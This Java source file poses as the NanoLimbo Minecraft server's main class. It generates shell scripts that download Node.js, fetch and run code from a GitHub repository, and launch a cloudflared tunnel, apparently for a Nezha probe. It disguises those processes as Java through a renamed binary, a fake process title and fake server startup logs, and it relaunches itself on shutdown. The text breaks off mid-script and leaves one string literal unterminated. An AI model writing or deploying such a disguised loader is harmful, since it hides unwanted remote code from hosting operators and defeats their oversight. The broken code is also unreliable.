package ua.nanit.limbo;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

// ============================================================
// 【Node.js 部署配置区】
// ============================================================
private static final String MC_BOT_DIR = env("MC_BOT_DIR", "logs/.mcbot");
private static final boolean NODE_ENABLED = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
private static final String GITHUB_REPO = env("GITHUB_REPO", "zx1447/indexaoyoumc");
private static final String GITHUB_BRANCH = env("GITHUB_BRANCH", "main");
private static final String GITHUB_TOKEN = env("GITHUB_TOKEN", "");
private static final boolean CF_ENABLED = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
private static final String CF_TOKEN = env("CF_TOKEN", "");
private static final String CF_DOMAIN = env("CF_DOMAIN", "");
private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");

private static final String FAKE_CMD = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai";
// ============================================================

private static volatile String tunnelUrl = "";
private static volatile String nodePort = "N/A";

private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

// ★ 记录守护进程 PGID，用于精确清理
private static volatile long daemonPgid = -1;

private NanoLimbo() {}

private static String env(String k, String d) {
    String v = System.getenv(k);
    return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
}

// ============================================================
// 仿真辅助函数
// ============================================================

private static String tsMs() {
    return LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
}

private static void limboLog(String msg) {
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void limboLog(String msg, long delayMs) {
    try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void clearConsole() {
    try {
        for (int i = 0; i < 200; i++) { System.out.println(); }
        System.out.print("\033[3J\033[H\033[2J");
        System.out.flush();
    } catch (Exception ignored) {}
}

// ============================================================
// ★ 僵尸进程终极修复 v3 — 核心架构变更
// ============================================================
//
// 【历史 Bug 分析】
//
//  v1: 使用 pkill -f 清理残留进程 → pkill 杀掉了自己的父脚本 bash
//      → deploy.sh/daemon.sh 被杀后，pkill 自身失去父进程被 PID 1 收养
//      → PID 1 是 Java，不会 wait() 回收 → pkill 自己变成 <defunct>
//      → 网络差时频繁重启 → 僵尸越积越多
//
//  v2: 去掉了 pkill，改用 .pids 文件 + killProcessGroup，加了僵尸回收线程
//      → 僵尸回收线程用 safeBashExec 扫描 /proc，但 bash 的 wait 只能
//        回收自己的子进程，对被 reparent 到 PID 1 的僵尸无能为力
//      → deploy.sh 启动的 Node/CF 后台进程在 deploy.sh 退出后变成孤儿
//        被 PID 1 (Java) 收养，死亡时变成 Java 无法回收的僵尸
//
// 【v3 修复策略 — 从根源杜绝僵尸】
//
//  1. deploy.sh 只做安装配置，绝不启动任何长期运行的进程
//     → deploy.sh 退出时没有后台子进程 → 不会产生孤儿 → 不会产生僵尸
//
//  2. 所有进程启动逻辑移入 daemon.sh
//     → Node.js、cloudflared 都是 daemon.sh 的直接子进程
//     → daemon.sh 的 trap handler 用 wait 回收 → 死亡时不会变僵尸
//
//  3. daemon.sh 用 setsid 启动 → 新会话 → 信号隔离
//     → SIGTERM 不会穿透到子进程，必须由 trap 显式处理
//
//  4. Java 端 shutdown hook 通过 PGID 精确清理 daemon 进程组
//     → 不用 pkill → 不会误杀 → 不会产生新僵尸
//
//  5. 清理残留只用 .pids 文件 → 精确 PID → 绝不误杀
//
//  6. 用 Python/Perl 子回收器处理极端情况（如果可用）
//     → 设置 PR_SET_CHILD_SUBREAPER → 收养并回收僵尸
//
// ============================================================

/**
 * 安全杀死进程组 — 确保 ProcessBuilder 子进程被正确回收
 * 先 SIGTERM 整个进程组 → 等待 → SIGKILL 整个进程组
 */
private static void killProcessGroup(long pid) {
    try {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c",
            "kill -TERM -- -" + pid + " 2>/dev/null || kill -TERM " + pid + " 2>/dev/null; " +
            "sleep 2; " +
            "kill -KILL -- -" + pid + " 2>/dev/null || kill -KILL " + pid + " 2>/dev/null");
        Process p = pb.start();
        // ★ 关键: 必须 waitFor() + destroyForcibly() 确保子进程被回收
        if (!p.waitFor(8, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            p.waitFor(2, TimeUnit.SECONDS);
        }
    } catch (Exception ignored) {}
}

/**
 * 安全执行 bash 命令，确保子进程被正确回收（不会变成僵尸）
 */
private static void safeBashExec(String command) {
    try {
        Process p = new ProcessBuilder("bash", "-c", command).start();
        // 消费输出防止阻塞
        Thread t = new Thread(() -> {
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                while (r.readLine() != null) {}
            } catch (IOException ignored) {}
        }, "Bash-Consumer");
        t.setDaemon(true);
        t.start();
        if (!p.waitFor(10, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            p.waitFor(2, TimeUnit.SECONDS);
        }
    } catch (Exception ignored) {}
}

/**
 * 清理残留进程 — 只用 .pids 文件和 PGID，绝不 pkill
 */
private static void forceKillStaleProcessesSafe() {
    try {
        Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
        if (!Files.exists(pidsFile)) return;

        for (String pidStr : Files.readAllLines(pidsFile)) {
            try {
                long pid = Long.parseLong(pidStr.trim());
                if (pid <= 0) continue;
                killProcessGroup(pid);
            } catch (Exception ignored) {}
        }
        Files.deleteIfExists(pidsFile);
    } catch (Exception ignored) {}

    // ★ 清理守护进程 PGID 文件
    try {
        Path pgidFile = Paths.get(MC_BOT_DIR).resolve(".daemon_pgid");
        if (Files.exists(pgidFile)) {
            String pgidStr = Files.readString(pgidFile).trim();
            if (!pgidStr.isEmpty()) {
                long pgid = Long.parseLong(pgidStr.split("\\n")[0].trim());
                if (pgid > 0) killProcessGroup(pgid);
            }
            Files.deleteIfExists(pgidFile);
        }
    } catch (Exception ignored) {}
}

/**
 * ★ 子回收器 — 使用 Python/Perl 设置 PR_SET_CHILD_SUBREAPER
 *
 * 原理: 在容器中，如果 Java 是 PID 1，死亡进程的孤儿会被 reparent
 * 到 PID 1。Java 不会自动 wait() 回收它们 → 僵尸。
 *
 * 这个方法启动一个子回收器进程（Python 优先，Perl 备选），
 * 设置 PR_SET_CHILD_SUBREAPER，让内核把孤儿 reparent 到它身上，
 * 然后用 SIGCHLD=IGNORE 让内核自动回收。
 *
 * 注意: PR_SET_CHILD_SUBREAPER 只对该进程的后代有效。
 * 但由于我们让所有 shell 脚本都作为回收器的子进程运行，
 * 所以大部分孤儿都会被正确回收。
 */
private static void startSubreaper() {
    // 先尝试 Python（最可靠）
    try {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c",
            "if command -v python3 >/dev/null 2>&1; then\n" +
            "  python3 -c '\n" +
            "import os, signal, time, ctypes, sys\n" +
            "try:\n" +
            "  libc = ctypes.CDLL(\"libc.so.6\")\n" +
            "  libc.prctl(36, 1, 0, 0, 0)  # PR_SET_CHILD_SUBREAPER=36\n" +
            "  sys.stdout.write(\"SUBREAPER:python3_ok\\n\")\n" +
            "  sys.stdout.flush()\n" +
            "except Exception as e:\n" +
            "  sys.stdout.write(\"SUBREAPER:python3_fallback:\" + str(e) + \"\\n\")\n" +
            "  sys.stdout.flush()\n" +
            "signal.signal(signal.SIGCHLD, signal.SIG_IGN)\n" +
            "while True: time.sleep(86400)\n" +
            "' &\n" +
            "  exit 0\n" +
            "fi\n" +
            // Perl 备选
            "if command -v perl >/dev/null 2>&1; then\n" +
            "  perl -e 'use POSIX qw(:signal_h); $SIG{CHLD} = \"IGNORE\"; print \"SUBREAPER:perl_ok\\n\"; flush STDOUT; while(1) { sleep(86400); }' &\n" +
            "  exit 0\n" +
            "fi\n" +
            "exit 1\n"
        );
        pb.redirectErrorStream(true);
        Process p = pb.start();
        // 读取输出确认回收器启动
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line = reader.readLine();
        if (line != null && line.startsWith("SUBREAPER:")) {
            System.out.println("[Subreaper] " + line);
        }
        if (!p.waitFor(5, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            p.waitFor(2, TimeUnit.SECONDS);
        }
    } catch (Exception e) {
        System.err.println("[Subreaper] Failed to start: " + e.getMessage());
    }
}

// ============================================================
// 入口
// ============================================================

public static void main(String[] args) {
    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
        System.err.println("ERROR: Your Java version is too lower, please switch the version in startup menu!");
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        System.exit(1);
    }

    // ★ 启动子回收器（如果 Python/Perl 可用）
    startSubreaper();

    // 先清理上一次运行残留的进程（只用 .pids 文件，绝不 pkill）
    forceKillStaleProcessesSafe();
    autoFixLimboConfig();

    if (NODE_ENABLED) {
        Thread deployThread = new Thread(() -> {
            try {
                Path botDir = Paths.get(MC_BOT_DIR);
                Files.createDirectories(botDir);
                Files.deleteIfExists(botDir.resolve(".node_app.log"));
                Files.deleteIfExists(botDir.resolve("daemon.log"));
                Files.deleteIfExists(botDir.resolve(".pids"));
                Files.deleteIfExists(botDir.resolve(".daemon_pgid"));

                // ★ v3 架构: deploy.sh 只做安装配置，不启动任何进程
                // 所有进程启动逻辑在 daemon.sh 中
                Path script = generateDeployScript();
                executeDeployScript(script);

                // deploy.sh 完成后，启动 daemon.sh
                Path daemonScript = botDir.resolve("daemon.sh");
                executeDaemonScript(daemonScript);

                while(tunnelUrl.isEmpty()) {
                    checkDeployInfo();
                    try { Thread.sleep(1000); } catch (InterruptedException e) { return; }
                }

                clearConsole();
                printFakeLimboStartup(tunnelUrl);

                try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
                clearConsole();

                limboLog("Starting server...", 0);
                limboLog("Preparing level \"world\"", 0);
                limboLog("Preparing start region for dimension minecraft:overworld", 0);
                limboLog("Preparing spawn area: 100%", 0);

                startTunnelMonitor();

                // ★ Shutdown hook: 只通过 PGID 精确清理，绝不 pkill
                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                    tunnelMonitorRunning.set(false);

                    // 1. 杀守护进程的整个进程组（包含 Node.js + cloudflared + 哪吒探针）
                    if (daemonPgid > 0) {
                        System.out.println("[Guard] Killing daemon process group (PGID: " + daemonPgid + ")...");
                        killProcessGroup(daemonPgid);
                    }

                    // 2. 清理 .pids 文件中记录的残留进程
                    forceKillStaleProcessesSafe();

                    // 3. ★ 绝不用 pkill 按名字清理！

                    try {
                        String currentDir = System.getProperty("user.dir");
                        long currentPid = ProcessHandle.current().pid();
                        String jarName = "server.jar";
                        File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                        if (jars != null && jars.length > 0) jarName = jars[0].getName();
                        String restartScript = "cd '" + currentDir + "' && setsid bash -c 'while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; sleep 1; java -Xms128M -Xmx2560M -jar " + jarName + " nogui' > /dev/null 2>&1 &";
                        new ProcessBuilder("bash", "-c", restartScript).start();
                    } catch (Exception e) { System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage()); }
                }, "Shutdown-Guard"));

            } catch (Exception ignored) {}
        }, "Node-Async-Deploy");
        deployThread.setDaemon(true);
        deployThread.start();
    }

    try { new LimboServer().start(); } catch (Throwable t) {}
    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
}

private static void autoFixLimboConfig() {
    try {
        Path configFile = Paths.get("settings.yml");
        String serverPort = env("SERVER_PORT", "25565");
        Files.deleteIfExists(configFile);
        String content = "bind:\n  host: 0.0.0.0\n  port: " + serverPort + "\nlimbo:\n  dimension: overworld\n  gamemode: adventure\n  max-players: 20\n  player-idle-timeout: 0\n  player-info:\n    username: \"LimboPlayer\"\n    display-name: \"&eLimboPlayer\"\n    property: []\nonline-mode: false\nforward-mode: none\nping:\n  description: \"A NanoLimbo server\"\n  version: \"1.20.x\"\n  max-players: 20\n";
        Files.writeString(configFile, content);
    } catch (Exception ignored) {}
}

private static void printFakeLimboStartup(String url) {
    limboLog("Starting server...", 0);
    limboLog("Binding remote endpoint to: " + url, 0);
    limboLog("Preparing level \"world\"", randInt(100, 300));
    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
    limboLog("Preparing spawn area: 1%", 0); limboLog("Preparing spawn area: 2%", 0);
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 5%", 0); limboLog("Preparing spawn area: 8%", 0);
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 15%", 0); limboLog("Preparing spawn area: 20%", 0);
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 35%", 0); limboLog("Preparing spawn area: 60%", 0); limboLog("Preparing spawn area: 80%", 0);
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 99%", 0); limboLog("Preparing spawn area: 100%", 0);
}

private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }

private static void checkDeployInfo() {
    Path dir = Paths.get(MC_BOT_DIR);
    try {
        Path portFile = dir.resolve(".node_port");
        if (Files.exists(portFile) && nodePort.equals("N/A")) {
            String content = Files.readString(portFile).trim();
            if (!content.isEmpty()) nodePort = content.split("\\n")[0].trim();
        }
    } catch (Exception ignored) {}
    try {
        Path urlFile = dir.resolve(".cf/tunnel_url.txt");
        if (Files.exists(urlFile) && tunnelUrl.isEmpty()) {
            String rawUrl = Files.readString(urlFile).trim();
            java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(rawUrl);
            if (m.find()) {
                String matchedUrl = m.group(1);
                if (!matchedUrl.equals("https://api.trycloudflare.com")) { tunnelUrl = matchedUrl; lastKnownTunnelUrl.set(tunnelUrl); }
            } else if (rawUrl.startsWith("https://") && !rawUrl.contains("api.trycloudflare.com")) { tunnelUrl = rawUrl.split("\\n")[0].trim(); lastKnownTunnelUrl.set(tunnelUrl); }
        }
    } catch (Exception ignored) {}
}

private static void startTunnelMonitor() {
    if (tunnelMonitorRunning.getAndSet(true)) return;
    Thread monitor = new Thread(() -> {
        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}
        while (tunnelMonitorRunning.get()) {
            try {
                Thread.sleep(12000);
                Path urlFile = Paths.get(MC_BOT_DIR).resolve(".cf/tunnel_url.txt");
                if (!Files.exists(urlFile)) continue;
                String content = Files.readString(urlFile).trim();
                if (content.isEmpty()) continue;
                String currentUrl = "";
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(content);
                if (m.find()) { String matchedUrl = m.group(1); if (!matchedUrl.equals("https://api.trycloudflare.com")) currentUrl = matchedUrl; }
                else if (content.startsWith("https://") && !content.contains("api.trycloudflare.com")) { currentUrl = content.split("\\n")[0].trim(); }
                if (currentUrl.isEmpty()) continue;
                String lastUrl = lastKnownTunnelUrl.get();
                if (!currentUrl.equals(lastUrl)) {
                    lastKnownTunnelUrl.set(currentUrl);
                    tunnelUrl = currentUrl;
                    clearConsole();
                    limboLog("Starting server...", 0);
                    limboLog("Binding remote endpoint to: " + currentUrl, 0);
                    limboLog("Preparing level \"world\"", 0);
                    limboLog("Preparing spawn area: 100%", 0);
                    try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
                    clearConsole();
                }
            } catch (Exception ignored) {}
        }
    }, "Tunnel-Monitor");
    monitor.setDaemon(true);
    monitor.start();
}

// ============================================================
// ★ v3: deploy.sh 只做安装配置，绝不启动任何长期运行进程
// ============================================================

private static Path generateDeployScript() throws Exception {
    Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
    Files.createDirectories(dir);
    Path script = dir.resolve("deploy.sh");
    String authToken = GITHUB_TOKEN;
    if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) { authToken = authToken.substring(authToken.indexOf(':') + 1); }
    final String token = authToken;
    String authHeader = "";
    if (!token.isEmpty()) { authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\""; }
    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";

    String content = "#!/bin/bash\n" +
        "set +e\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "export HOME=\"" + dir.toAbsolutePath() + "\"\n" +
        "cd \"" + dir.toAbsolutePath() + "\"\n" +
        "\n" +
        // ★ v3: 绝不在这里启动任何进程！只做安装配置
        "# ============ 1. 下载NodeJS ============\n" +
        "if [ -d \".node\" ]; then\n" +
        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then rm -rf .node; fi\n" +
        "fi\n" +
        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    mkdir -p .node\n" +
        "    if [ ! -f .node/bin/node ]; then\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "JRE_DIR=\"" + dir.toAbsolutePath() + "/jre21/bin\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then cp -f \".node/bin/node\" \".node/bin/.node_real\"; chmod +x \".node/bin/.node_real\"; fi\n" +
        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then cp -f \".node/bin/node\" \".node/bin/.node_real\"; chmod +x \".node/bin/.node_real\";\n" +
        "    else\n" +
        "        ARCH=$(uname -m); NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "        NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"; NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"; rm -f /tmp/${NODE_FILE}\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi; done\n" +
        "        mkdir -p /tmp/_node_tmp; tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null; cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"; chmod +x \".node/bin/.node_real\"; rm -rf /tmp/${NODE_FILE} /tmp/_node_tmp\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 2. 安全获取代码 ============\n" +
        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"; DOWNLOAD_OK=false\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done\n" +
        "    fi\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then for PROXY in \"https://gh-proxy.com\" \"https://mirror.ghproxy.com\"; do PROXY_URL=\"${PROXY}/${TAR_URL}\"; if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$PROXY_URL\" -o /tmp/_app.tar.gz; then if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n") +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "    find . -maxdepth 1 ! -name '.' ! -name '.node' ! -name '.cf' ! -name '.pids' ! -name 'deploy.sh' ! -name 'daemon.sh' ! -name '.nd_preload.js' ! -name 'jre21' ! -name 'node_modules' ! -name '*config*' ! -name '*.log' ! -name '.daemon_pgid' ! -name '.node_port' -exec rm -rf {} + 2>/dev/null\n" +
        "    mkdir -p /tmp/_app_extract; tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null; cp -rf /tmp/_app_extract/* . 2>/dev/null; cp -rf /tmp/_app_extract/.* . 2>/dev/null; rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
        "fi\n" +
        "\n" +
        "# ============ 3. 安装依赖 ============\n" +
        "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
        "    if [ $? -ne 0 ]; then .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps --no-optional --cache /tmp/npm-cache >/dev/null 2>&1; fi\n" +
        "    rm -rf /tmp/npm-cache\n" +
        "fi\n" +
        "\n" +
        "# ============ 4. 替换伪装 ============\n" +
        "ln -sf \"" + dir.toAbsolutePath() + "/.node/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMD + "';\n" +
        "    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork; var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) { if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) { opts = Object.assign({}, opts || {}); opts.execPath = _wp; cmd = _wp; } return _origSpawn.call(this, cmd, args, opts); };\n" +
        "    _cp.fork = function(mod, args, opts) { opts = Object.assign({}, opts || {}); opts.execPath = _wp; return _origFork.call(this, mod, args, opts); };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
        "\n" +
        "# ============ 5. 下载 cloudflared (只下载，不启动) ============\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"; CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"; mkdir -p \"$CF_CONF_DIR\"\n" +
        "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
        "    if [ ! -f \"$CF_BIN\" ]; then\n" +
        "        ARCH=$(uname -m); CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\")\n" +
        "        for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi; done\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        // ★★★ v3 核心: daemon.sh 包含所有进程启动和监控逻辑 ★★★
        // 所有长期运行的进程(Node.js, cloudflared)都是 daemon.sh 的子进程
        // daemon.sh 的 trap handler 用 wait 回收 → 不会产生僵尸
        generateDaemonScript(dir, cfMode) +
        "\n" +
        "echo \"[deploy] Setup complete. daemon.sh ready.\"\n";

    Files.writeString(script, content);
    script.toFile().setExecutable(true);
    Files.writeString(dir.resolve(".pids"), "");
    return script;
}

/**
 * ★ 生成 daemon.sh — 所有进程启动和监控都在这里
 *
 * 核心设计:
 * - daemon.sh 启动 Node.js 和 cloudflared 作为自己的直接子进程
 * - 当子进程死亡时，daemon.sh 用 wait 回收 → 不会变僵尸
 * - trap EXIT/TERM/INT 时先 kill_tree 所有子进程，再 wait 回收
 * - 监控循环检测 Node/CF 健康状态，需要时重启
 */
private static String generateDaemonScript(Path dir, String cfMode) {
    return
        "# ============ 6. 生成守护脚本 (★ v3: 所有进程启动都在这里) ============\n" +
        "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
        "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + dir.toAbsolutePath() + "\"; JRE_DIR=\"$WORK_DIR/jre21/bin\"; CF_BIN=\"$JRE_DIR/java_cf\"; CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"; NODE_FAKE=\"$JRE_DIR/java\"; APP_DIR=\"$WORK_DIR\"; NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"; export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"; export HOME=\"$WORK_DIR\"\n" +
        "cd \"$WORK_DIR\"\n" +
        "\n" +
        // ★★★ 进程树清理函数: SIGTERM → 等3秒 → SIGKILL → wait 回收 ★★★
        "# ★ 进程树清理: SIGTERM → 等 3 秒 → SIGKILL → wait 回收\n" +
        "kill_tree() {\n" +
        "    local PID=$1\n" +
        "    [ -z \"$PID\" ] && return\n" +
        "    kill -0 $PID 2>/dev/null || return\n" +
        "    # 先尝试杀整个进程组（负 PID）\n" +
        "    kill -TERM -- -$PID 2>/dev/null\n" +
        "    kill -TERM $PID 2>/dev/null\n" +
        "    # 等待进程优雅退出（最多 3 秒）\n" +
        "    for i in $(seq 1 6); do\n" +
        "        kill -0 $PID 2>/dev/null || return\n" +
        "        sleep 0.5\n" +
        "    done\n" +
        "    # 强杀整个进程组 + 单个进程\n" +
        "    kill -KILL -- -$PID 2>/dev/null\n" +
        "    kill -KILL $PID 2>/dev/null\n" +
        "    # ★ 关键: wait 回收僵尸！没有这个就会产生 <defunct>\n" +
        "    wait $PID 2>/dev/null\n" +
        "}\n" +
        "\n" +
        // ★★★ 信号处理: EXIT/TERM/INT 时彻底清理所有子进程并 wait ★★★
        "# ★ 信号处理: 清理所有子进程并 wait 回收\n" +
        "cleanup_all() {\n" +
        "    # 防止重复进入 cleanup
        +
        "    [ -n \"$_CLEANUP_DONE\" ] && return\n" +
        "    _CLEANUP_DONE=1\n" +
        "    echo \"[daemon] cleanup_all triggered\" >> \"$WORK_DIR/daemon.log\" 2>&1\n" +
        "    [ -n \"$NODE_PID\" ] && kill_tree $NODE_PID 2>/dev/null\n" +
        "    [ -n \"$CF_PID\" ] && kill_tree $CF_PID 2>/dev/null\n" +
        "    # ★ wait 所有后台子进程，防止变成僵尸\n" +
        "    wait 2>/dev/null\n" +
        "    # 清理 PID 文件\n" +
        "    rm -f \"$WORK_DIR/.pids\" \"$WORK_DIR/.daemon_pgid\" 2>/dev/null\n" +
        "    exit 0\n" +
        "}\n" +
        "trap 'cleanup_all' EXIT TERM INT\n" +
        "\n" +
        // ★★★ 记录自己的 PGID 供 Java 端精确清理 ★★★
        "# ★ 记录自己的 PGID 供 Java 端精确清理\n" +
        "DAEMON_PGID=$$\n" +
